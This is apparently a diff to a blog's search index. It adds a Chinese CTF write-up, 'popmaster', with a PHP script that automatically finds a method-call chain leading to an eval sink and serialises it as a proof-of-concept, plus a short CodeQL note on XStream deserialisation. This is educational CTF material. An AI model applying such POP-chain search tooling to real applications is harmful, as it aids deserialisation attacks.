@@ -4,6 +4,44 @@
   
   
   <entry>
+    <title>popmaster</title>
+    <link href="/2021/07/26/popmaster/"/>
+    <url>/2021/07/26/popmaster/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 在writeup看到的一道解法有意思的题目。</p><a id="more"></a><hr><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>最有意思的解法就是参考文章中利用__get和__call魔术方法实现的搜索函数调用路径的方法，这里就不多说了。</p><p>个人觉得这种做法要修改整个文件，还是有点麻烦的，就想试试看将思路结合一下，还有没有好用又方便的方法。</p><p>先来看看题目给的生成器，这道题目的代码由很多类组成，要求就是通过一层层的函数调用最后调用里面写好的eval函数执行代码。</p><p>一个类的模板如下：</p><pre><code class="python">muban = &quot;&quot;&quot;class {class_name}{{    public ${var_name};    public function {func_name1}(${random1}){{{func_name1}_other{func_name1_call1}{func_name1_call2}    }}    public function {func_name2}(${random2}){{{func_name2}_other{func_name2_call1}{func_name2_call2}    }}}}&quot;&quot;&quot;</code></pre><p>简单来说就是一个成员变量，两个成员函数，成员函数中会将成员变量当作一个对象然后调用某个特定名字的函数，不管这个对象中有没有这个函数。</p><p>按照它生成函数调用的方法：</p><pre><code class="python">for i in range(9990):    func = array.pop(0)    key1 = random.sample(method_list_keys, 1)[0]    method_list_keys.remove(key1)    if random.randint(0, 1):        key2 = random.sample(method_list_keys, 1)[0]        method_list_keys.remove(key2)        func_map[func] = [key1, key2]        array.append(key1)        array.append(key2)    else:        func_map[func] = [key1]        array.append(key1)</code></pre><p>每个函数只会调用一次，所以就算使用遍历法找调用链也不会产生回环。</p><p>继续观察，可以发现生成的成员函数中不会对函数调用有什么限制，最多就是通过method_exists检查以下这个函数是否存在于对象中：</p><pre><code class="php">if (method_exists($this-&gt;Vy6VBZh, &#39;gU2rkn&#39;)) $this-&gt;Vy6VBZh-&gt;gU2rkn($OHfAC);if (method_exists($this-&gt;Vy6VBZh, &#39;XGKKQq&#39;)) $this-&gt;Vy6VBZh-&gt;XGKKQq($OHfAC);</code></pre><p>这部分通过使用命名空间重新编写一个method_exists函数，并直接return一个true来解决：</p><pre><code class="php">namespace twings {    function method_exists($m) {        return true;    }    class ... {        ...    }}</code></pre><p>唯一限制我们利用的是调用函数前对参数的修改：</p><pre><code class="python">def clean_stmts(arg):    #print(arg)    stmts = [        &quot;\t\tfor($i = 0; $i &lt; &quot; +str(random.randint(0,40))+ &quot;; $i ++){\n\t\t\t$&quot; + arg + &quot;= $&quot; + get_random_str(5) + &quot;;\n\t\t}\n&quot;,        &quot;\t\t$&quot; + arg + &quot;=&#39;&quot; + get_random_str(5) + &quot;&#39;;\n&quot;    ]    return random.choice(stmts)</code></pre><p>这里可以通过自定义类的魔术方法来解决：</p><pre><code class="php">class CheckArguments {    public $pass = false;    public function __call($name, $arguments) {        global $code;        if (strpos($arguments[0], $code) === 0) {            $this -&gt; pass = true;        }    }}</code></pre><p>然后实例化一个CheckArguments对象作为成员变量来调用函数就可以检查该成员函数中有没有对参数做什么修改，获取成员变量可以通过反射进行：</p><pre><code class="php">function getProperties($className) {    $refClass = new ReflectionClass($className);    return (($refClass -&gt; getProperties())[0]) -&gt; getName();}</code></pre><p>最后的检测代码类似：</p><pre><code class="php">$propertyName = getProperties($className);$obj -&gt; $propertyName = new CheckArguments();$obj -&gt; $functionName($code);if (!$obj -&gt; $propertyName -&gt; pass) {    return;}</code></pre><p>同样用魔术方法来确认下一个调用的函数名：</p><pre><code class="php">class CheckNextFunctionCall {    public $nextFunctionCalls = array();    public function __call($name, $arguments) {        $this -&gt; nextFunctionCalls[] = $name;    }}</code></pre><p>在通过函数名反向获取含有该函数的类时，要先处理出一个函数名和类名的对应数组：</p><pre><code class="php">$classes = get_declared_classes();$functionList = array();foreach ($classes as $className) {    if (strpos($className, &quot;twings\\&quot;) !== 0) {        continue;    }    $classMethods = get_class_methods($className);    $functionList[$classMethods[0]] = $className;    $functionList[$classMethods[1]] = $className;}</code></pre><p>如果eval函数成功了，可以通过抛出一个自定义错误的方式进行确认：</p><pre><code class="php">class EvalError extends Error {}</code></pre><p>最后组合一下：</p><pre><code class="php">&lt;?phperror_reporting(0);include &quot;class.php&quot;;$code = &quot;throw new EvalError(\&quot;EvalError!\&quot;);//&quot;;$classes = get_declared_classes();$functionList = array();foreach ($classes as $className) {    if (strpos($className, &quot;twings\\&quot;) !== 0) {        continue;    }    $classMethods = get_class_methods($className);    $functionList[$classMethods[0]] = $className;    $functionList[$classMethods[1]] = $className;}class CheckNextFunctionCall {    public $nextFunctionCalls = array();    public function __call($name, $arguments) {        $this -&gt; nextFunctionCalls[] = $name;    }}class CheckArguments {    public $pass = false;    public function __call($name, $arguments) {        global $code;        if (strpos($arguments[0], $code) === 0) {            $this -&gt; pass = true;        }    }}class EvalError extends Error {}function getProperties($className) {    try {        $refClass = new ReflectionClass($className);        return (($refClass -&gt; getProperties())[0]) -&gt; getName();    } catch (ReflectionException $e) {        // pass    }    return null;}function nice($functionCallArray) {    var_dump($functionCallArray);    file_put_contents(&quot;poc&quot;, serialize($functionCallArray));    exit(0);}function checkNextFunctionCall($functionCallArray, $className, $propertyName, $functionName) {    global $code, $functionList;    $obj = new $className();    try {        $obj -&gt; $propertyName = new CheckArguments();        $obj -&gt; $functionName($code);        if (!$obj -&gt; $propertyName -&gt; pass) {            return;        }        $obj -&gt; $propertyName = new CheckNextFunctionCall();        $obj -&gt; $functionName($code);        $nextFunctionCalls = $obj -&gt; $propertyName -&gt; nextFunctionCalls;        foreach ($nextFunctionCalls as $nextFunctionCall) {            $nextClassName = $functionList[$nextFunctionCall];            $nextPropertyName = getProperties($nextClassName);            $newFunctionCallArray = array();            foreach ($functionCallArray as $value) {                $newFunctionCallArray[] = $value;            }            $newFunctionCallArray[] = array(substr($nextClassName, 7), $nextPropertyName, $nextFunctionCall);            checkNextFunctionCall($newFunctionCallArray, $nextClassName, $nextPropertyName, $nextFunctionCall);        }    } catch (EvalError $e) {        nice($functionCallArray);    } catch (Error $e) {        // pass    }}checkNextFunctionCall(array(array(&quot;EmSIct&quot;, &quot;q05NNeL&quot;, &quot;fguV7Y&quot;)), &quot;twings\\&quot; . &quot;EmSIct&quot;, &quot;q05NNeL&quot;, &quot;fguV7Y&quot;);</code></pre><p>收获良多。</p><hr><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.freebuf.com/articles/web/279680.html" target="_blank" rel="noopener">writeup</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>CodeQL入门2</title>
+    <link href="/2021/05/31/CodeQL%E5%85%A5%E9%97%A82/"/>
+    <url>/2021/05/31/CodeQL%E5%85%A5%E9%97%A82/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 学学学，试试用CodeQL分析一下Xstream反序列化链。</p><a id="more"></a><hr><h3 id="不会起名"><a href="#不会起名" class="headerlink" title="不会起名"></a>不会起名</h3><p>随便弄个Xstream项目，然后用CodeQL建立数据库：</p><pre><code class="shell">codeql database create java-database --language=java --command=&#39;mvn clean install&#39;</code></pre><p>分析之前要下载好依赖源码，如果mvn打包时遇到编译环境之类的问题，可以参考<a href="https://www.cnblogs.com/lick468/p/10465866.html" target="_blank" rel="noopener">这篇文章</a>，如果遇到缺少包可以参考<a href="https://blog.csdn.net/zyxwvuuvwxyz/article/details/78411575" target="_blank" rel="noopener">这篇</a>。</p><hr><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>CodeQL入门</title>
     <link href="/2021/05/29/CodeQL%E5%85%A5%E9%97%A8/"/>
     <url>/2021/05/29/CodeQL%E5%85%A5%E9%97%A8/</url>
@@ -1197,9 +1235,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1275,9 +1313,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>Web</tag>
+      
+      <tag>Crypto</tag>
       
       <tag>Pwn</tag>
       
@@ -1298,9 +1336,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1319,9 +1357,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1340,9 +1378,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1403,9 +1441,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>Web</tag>
+      
+      <tag>Crypto</tag>
       
       <tag>Pwn</tag>
       
@@ -1426,9 +1464,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1447,9 +1485,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1468,9 +1506,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1489,9 +1527,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>复现</tag>
       
@@ -1571,9 +1609,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1632,9 +1670,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>复现</tag>
       
@@ -1655,9 +1693,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1676,9 +1714,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1716,9 +1754,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1737,9 +1775,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Crypto</tag>
       
     </tags>
     
@@ -1777,9 +1815,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Crypto</tag>
       
     </tags>
     
@@ -1798,9 +1836,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -2002,9 +2040,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
